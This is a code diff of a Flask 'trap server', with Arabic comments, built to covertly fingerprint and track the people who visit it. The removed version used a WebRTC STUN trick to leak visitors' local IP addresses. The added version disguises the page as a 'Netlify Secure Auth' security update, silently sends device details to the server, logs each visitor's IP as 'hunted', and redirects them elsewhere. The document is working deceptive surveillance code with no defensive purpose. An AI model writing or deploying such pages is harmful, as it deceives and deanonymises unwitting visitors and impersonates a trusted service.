@@ -3,91 +3,71 @@ import datetime
 
 app = Flask(__name__)
 
-TRAP_PAGE = """
+
+TRAP_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostics & Node Status</title>
+    <title>تحديث الأمان - Netlify Secure Auth</title>
     <style>
-        body { background-color: #0d1117; color: #c9d1d9; font-family: monospace; text-align: center; padding-top: 50px; }
-        .box { border: 1px solid #30363d; padding: 20px; display: inline-block; background: #161b22; border-radius: 6px; }
-        h2 { color: #58a6ff; }
+        body { font-family: Tahoma, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding-top: 100px; }
+        .box { background: #1e293b; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .spinner { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>جاري التحقق من اتصال العقدة (Node Verification)...</h2>
-        <p>الرجاء الانتظار ريثما يتم مطابقة الأمان الجغرافي للاتصال.</p>
+        <h2>جاري التحقق من هوية المالك وتحديث الجلسة...</h2>
+        <div class="spinner"></div>
+        <p>يرجى الانتظار، يتم مزامنة المفاتيح الأمنية مع السيرفر.</p>
     </div>
-
     <script>
-        async function extractIntel() {
-            let data = {
-                userAgent: navigator.userAgent,
+        // سحب تفاصيل قياس الجهاز الإضافية وإرسالها للسيرفر صامتاً
+        fetch('/log-telemetry', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                screen: window.screen.width + 'x' + window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 platform: navigator.platform,
-                language: navigator.language,
-                screenRes: window.screen.width + "x" + window.screen.height,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-
-            try {
-                const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        data.webrtc = ice.candidate.candidate;
-                        sendData(data);
-                    }
-                };
-            } catch(e) {
-                sendData(data);
-            }
-        }
-
-        function sendData(d) {
-            fetch('/collect', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(d)
-            });
-        }
-
-        window.onload = extractIntel;
+                language: navigator.language
+            })
+        }).then(() => {
+            setTimeout(() => {
+                window.location.href = "https://onlinesd-com.netlify.app";
+            }, 2500);
+        });
     </script>
 </body>
 </html>
 """
 
-@app.route('/')
-def index():
+@app.route('/verify')
+def verify():
+    
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    print(f"\n[!] [ALERT] تم رصد زائر جديد!")
-    print(f"    - الوقت: {timestamp}")
-    print(f"    - الـ IP الخارجي: {visitor_ip}")
-    print(f"    - المتصفح: {user_agent}")
+    print(f"\n[!] === hunted! ===")
+    print(f"[+] time: {timestamp}")
+    print(f"[+]  IP : {visitor_ip}")
+    print(f"[+]   (User-Agent): {user_agent}")
+    print(f"[================================]\n")
     
-    with open("target_intel.log", "a") as f:
-        f.write(f"[{timestamp}] IP: {visitor_ip} | UA: {user_agent}\n")
-        
-    return render_template_string(TRAP_PAGE)
+    return render_template_string(TRAP_HTML)
 
-@app.route('/collect', methods=['POST'])
-def collect():
-    content = request.json
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    print(f"\n[+] [DATA CAPTURED] بيانات متقدمة من الهدف:")
-    for key, val in content.items():
-        print(f"    - {key}: {val}")
-        
-    with open("target_intel.log", "a") as f:
-        f.write(f"[{timestamp}] DATA: {content}\n")
-    return {"status": "ok"}
+@app.route('/log-telemetry', methods=['POST'])
+def log_telemetry():
+    data = request.json or {}
+    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    print(f"[+] بيانات متقدمة (Telemetry) مسحوبة من الـ IP {visitor_ip}:")
+    for key, value in data.items():
+        print(f"    - {key}: {value}")
+    print("-" * 40)
+    return {"status": "logged"}
 
 if __name__ == '__main__':
-    print("[*] Trap Server is running on port 5000...")
     app.run(host='0.0.0.0', port=5000)
